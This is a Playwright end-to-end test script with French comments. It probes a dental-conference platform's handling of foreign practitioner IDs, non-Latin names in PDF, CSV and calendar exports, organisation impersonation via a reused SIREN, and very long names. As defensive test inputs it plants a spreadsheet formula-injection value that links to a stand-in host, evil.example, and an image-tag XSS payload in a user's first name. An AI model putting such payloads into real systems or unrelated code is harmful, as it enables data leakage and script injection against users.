// Scénarios métier : conférenciers étrangers, noms non latins, « Straumann », injections, chaînes longues.
import { chromium } from "playwright";
import pg from "pg";
import fs from "node:fs";
import { execFileSync } from "node:child_process";

const BASE = "http://localhost:3000", PW = "demo-ci-mot-de-passe-1", D = "@demo.kolbase.local";
const db = new pg.Client({ connectionString: process.env.DATABASE_URL });
await db.connect();
const browser = await chromium.launch();
const OUT = "/home/claude/kb-tests/scen";
fs.mkdirSync(OUT, { recursive: true });
const log = (...a) => console.log(...a);
const RUN = process.env.RUN ?? "ABCDE";
const main = (page) => page.locator("main").innerText();

async function ctxAs(email) {
  const ctx = await browser.newContext({ locale: "fr-FR" });
  const page = await ctx.newPage();
  if (email) {
    await page.goto(`${BASE}/connexion`);
    await page.fill('input[name="email"]', email);
    await page.fill('input[name="password"]', PW);
    await Promise.all([page.waitForURL((u) => !u.pathname.startsWith("/connexion"), { timeout: 15000 }), page.click('button:has-text("Se connecter")')]);
  }
  return { ctx, page };
}
async function signUp(first, last, email, profession) {
  const ctx = await browser.newContext({ locale: "fr-FR" });
  const page = await ctx.newPage();
  await page.goto(`${BASE}/inscription`);
  await page.fill('input[name="firstName"]', first);
  await page.fill('input[name="lastName"]', last);
  await page.fill('input[name="email"]', email);
  await page.selectOption('select[name="profession"]', profession);
  await page.fill('input[name="password"]', PW);
  await page.check('input[name="cgu"]');
  await Promise.all([page.waitForURL((u) => !u.pathname.startsWith("/inscription"), { timeout: 15000 }), page.click('button:has-text("Créer mon compte")')]);
  return { ctx, page };
}
async function download(ctx, path, file) {
  const r = await ctx.request.get(BASE + path);
  const buf = await r.body();
  fs.writeFileSync(`${OUT}/${file}`, buf);
  return { status: r.status(), type: r.headers()["content-type"], disp: r.headers()["content-disposition"], buf };
}
const pdfText = (file) => execFileSync("pdftotext", ["-layout", `${OUT}/${file}`, "-"]).toString();

// ── A. Conférencière belge (INAMI, pas de RPPS) ─────────────────────────────
if (RUN.includes("A")) {
  log("\n### A. Conférencière belge");
  const { page } = await signUp("Marie", "Peeters", "marie.peeters@cabinet-bruxelles.be", "Chirurgien-dentiste");
  await page.goto(`${BASE}/compte`);
  await page.click('button:has-text("Être référencé"), button:has-text("Me référencer"), form button.btn:not(.ghost):not(.secondary):not(.danger)', { trial: true }).catch(() => {});
  const listBtn = page.locator("button", { hasText: /référenc/i }).first();
  log("bouton de référencement :", await listBtn.innerText().catch(() => "introuvable"));
  await listBtn.click();
  await page.waitForTimeout(800);
  const t = await main(page);
  log("référencement sans RPPS →", (t.match(/Renseignez d'abord[^\n]*/) ?? ["(pas de message)"])[0]);
  // Le numéro INAMI belge compte aussi 11 chiffres : passe-t-il le contrôle de format RPPS ?
  await page.fill('input[name="rpps"]', "31234567890");
  await page.fill('input[name="city"]', "Bruxelles");
  await page.locator("form", { has: page.locator('input[name="rpps"]') }).locator("button.btn").click();
  await page.waitForTimeout(800);
  const r = await db.query(`select p.rpps, p.country, p.city from "PractitionerProfile" p join "User" u on u.id=p."userId" where u.email=$1`, ["marie.peeters@cabinet-bruxelles.be"]);
  log("INAMI saisi comme RPPS → enregistré :", r.rows[0]);
  await page.goto(`${BASE}/compte`);
  await page.locator("button", { hasText: /référenc/i }).first().click();
  await page.waitForTimeout(800);
  log("référencement avec INAMI →", (await main(page)).match(/Vous êtes référencé[^\n]*|vérifi[^\n]*/)?.[0]);
  const pays = await page.locator('select[name="country"], input[name="country"]').count();
  log("champ pays dans le profil :", pays ? "oui" : "non");
}

// ── B. Conférencier américain (licence d'État, pas de RPPS) ─────────────────
if (RUN.includes("B")) {
  log("\n### B. Conférencier américain");
  const { page } = await signUp("John", "O'Brien-Smith", "john.obrien@smile-dental.us", "Chirurgien-dentiste");
  await page.goto(`${BASE}/compte`);
  await page.locator("button", { hasText: /référenc/i }).first().click();
  await page.waitForTimeout(800);
  log("référencement →", (await main(page)).match(/Renseignez d'abord[^\n]*/)?.[0]);
  // Une organisation peut-elle le solliciter ? (createProject n'accepte que des profils référencés)
  const { rows } = await db.query(`select p.id, p.listed from "PractitionerProfile" p join "User" u on u.id=p."userId" where u.email='john.obrien@smile-dental.us'`);
  log("profil :", rows[0], "→ invisible de l'annuaire, non sollicitable, ne peut pas candidater aux appels");
  // Interface en anglais ?
  log("choix de langue proposé :", (await page.locator('select[name="locale"]').count()) ? "oui" : "non (français uniquement)", "| <html lang> =", await page.getAttribute("html", "lang"));
}

// ── C. Noms non latins dans les conventions PDF, CSV et iCalendar ───────────
if (RUN.includes("C")) {
  log("\n### C. Noms non latins + injection de formule");
  await db.query(`update "User" set "firstName"='Łukasz', "lastName"='Żółć-Dvořák' where id='demo-u-durand'`);
  await db.query(`update "User" set "firstName"='=HYPERLINK("http://evil.example/?x="&A1;"Cliquez")', "lastName"='Νίκος Παπαδόπουλος 王伟' where id='demo-u-lambert'`);
  const { ctx } = await ctxAs("claire.morel" + D);
  let d = await download(ctx, "/organisations/demo-org-dentalys/dossiers/demo-prj-board/convention/demo-prj-board-x1", "convention-durand.pdf");
  log("PDF convention :", d.status, d.type, d.disp);
  const txt = pdfText("convention-durand.pdf");
  log("  nom dans le PDF :", JSON.stringify((txt.match(/[^\n]*(ukasz|Dvo|ó)[^\n]*/) ?? ["(absent)"])[0].trim()));
  d = await download(ctx, "/organisations/demo-org-dentalys/hospitalites/convention/demo-reg-soiree-implanto-lambert", "hospitalite-lambert.pdf");
  log("PDF hospitalité :", d.status, "→", JSON.stringify((pdfText("hospitalite-lambert.pdf").match(/[^\n]*HYPERLINK[^\n]*/) ?? ["(absent)"])[0].trim()));
  for (const [p, f] of [["/organisations/demo-org-dentalys/evenements/demo-ev-soiree-implanto/export", "inscrits.csv"], ["/organisations/demo-org-dentalys/hospitalites/export", "hospitalites.csv"], ["/organisations/demo-org-dentalys/conformite/export", "conformite.csv"]]) {
    d = await download(ctx, p, f);
    const s = d.buf.toString("utf8");
    const line = s.split(/\r?\n/).find((l) => l.includes("HYPERLINK") || l.includes("Łukasz")) ?? "(aucune ligne concernée)";
    log(`CSV ${f} :`, d.status, d.type, "→", JSON.stringify(line.slice(0, 160)));
  }
  d = await download(ctx, "/organisations/demo-org-dentalys/evenements/calendrier", "orga.ics");
  log("ICS organisation :", d.status, d.type);
  await ctx.close();
}

// ── D. « Straumann » : nom, logo, homonymes, usurpation ─────────────────────
if (RUN.includes("D")) {
  log("\n### D. Organisation « Straumann »");
  const { ctx, page } = await signUp("Paul", "Testeur", "paul.testeur@exemple-straumann.fr", "");
  await page.goto(`${BASE}/organisations/nouvelle`);
  const fileInputs = await page.locator('input[type="file"]').count();
  log("champ logo à la création :", fileInputs ? "oui" : "non");
  await page.fill('input[name="name"]', "Straumann");
  await page.selectOption('select[name="kind"]', "INDUSTRIEL");
  await page.fill('input[name="siren"]', "399951037");
  await Promise.all([page.waitForURL((u) => /^\/organisations\/(?!nouvelle)[^/]+$/.test(u.pathname), { timeout: 15000 }), page.click('button:has-text("Créer l\'organisation")')]);
  const orgUrl = page.url();
  const orgId = orgUrl.split("/").pop();
  log("créée :", orgUrl.replace(BASE, ""));
  log("  bandeau :", JSON.stringify((await main(page)).split("\n").find((l) => /valid|vérif/i.test(l)) ?? ""));
  const o = (await db.query(`select name, "legalName", siren, verification, listed from "Organization" where id=$1`, [orgId])).rows[0];
  log("  en base :", o);
  await page.goto(`${BASE}/organisations/${orgId}/membres`);
  log("champ logo dans les réglages :", (await page.locator('input[type="file"]').count()) ? "oui" : "non");
  const avatar = await page.locator(".avatar, [class*=avatar]").first().innerText().catch(() => "(aucun)");
  log("  visuel de l'organisation : initiales", JSON.stringify(avatar));
  // Accès aux fonctions avant validation
  await page.goto(`${BASE}/organisations/${orgId}/dossiers/nouveau`);
  log("  dossier avant validation :", JSON.stringify((await main(page)).split("\n").find((l) => /valid/i.test(l)) ?? "(pas de blocage affiché)"));
  await page.goto(`${BASE}/annuaire`);
  log("  annuaire avant validation :", page.url().replace(BASE, ""));
  const pub = await (await ctx.request.get(`${BASE}/structures/${orgId}`, { maxRedirects: 0 })).status();
  log("  page publique /structures avant validation :", pub);
  // Deuxième compte : même nom, même SIREN
  const second = await signUp("Usurpateur", "Test", "faux.straumann@gmail-test.fr", "");
  await second.page.goto(`${BASE}/organisations/nouvelle`);
  await second.page.fill('input[name="name"]', "Straumann France");
  await second.page.fill('input[name="siren"]', "399951037");
  await second.page.click('button:has-text("Créer l\'organisation")');
  await second.page.waitForTimeout(1500);
  log("  2e organisation, même SIREN :", second.page.url().includes("/nouvelle") ? "refusée → " + ((await main(second.page)).match(/SIREN[^\n]*/)?.[0] ?? "") : "acceptée (" + second.page.url().replace(BASE, "") + ")");
  const n = (await db.query(`select count(*)::int c from "Organization" where siren='399951037'`)).rows[0].c;
  log("  organisations avec ce SIREN :", n);
  // Vue de l'administrateur KolBase
  const admin = await ctxAs("anne.chevalier" + D);
  await admin.page.goto(`${BASE}/admin`);
  const adm = await main(admin.page);
  const idx = adm.indexOf("Straumann");
  log("  file admin :", JSON.stringify(adm.slice(Math.max(0, idx - 20), idx + 260)));
  await admin.ctx.close();
  // Renommer une organisation validée en « Straumann » (Claire, Dentalys)
  const claire = await ctxAs("claire.morel" + D);
  await claire.page.goto(`${BASE}/organisations/demo-org-dentalys/membres`);
  const f = claire.page.locator("form", { has: claire.page.locator('input[name="name"]') }).first();
  await f.locator('input[name="name"]').fill("Straumann");
  await f.locator("button.btn").click();
  await claire.page.waitForTimeout(1000);
  const v = (await db.query(`select name, verification, listed from "Organization" where id='demo-org-dentalys'`)).rows[0];
  log("  Dentalys renommée « Straumann » →", v);
  await db.query(`update "Organization" set name='Dentalys Implants', verification='VERIFIED', listed=true, "verificationNote"=null where id='demo-org-dentalys'`);
  await claire.ctx.close();
  await ctx.close();
}

// ── E. Chaînes longues et balises ───────────────────────────────────────────
if (RUN.includes("E")) {
  log("\n### E. Chaînes longues / balises");
  const { ctx, page } = await signUp("<img src=x onerror=alert(1)>", "A".repeat(3000), "long.nom@exemple-test.fr", "Chirurgien-dentiste");
  let alerted = false;
  page.on("dialog", async (d) => { alerted = true; await d.dismiss(); });
  await page.goto(`${BASE}/compte`);
  await page.setViewportSize({ width: 375, height: 800 });
  await page.screenshot({ path: `${OUT}/compte-nom-long-375.png` });
  const overflow = await page.evaluate(() => document.documentElement.scrollWidth > window.innerWidth);
  log("balise dans le prénom exécutée :", alerted ? "OUI (XSS)" : "non", "| débordement horizontal à 375 px :", overflow);
  const len = (await db.query(`select length("lastName") l from "User" where email='long.nom@exemple-test.fr'`)).rows[0];
  log("nom de 3000 caractères accepté :", len);
  await ctx.close();
}

await browser.close();
await db.end();
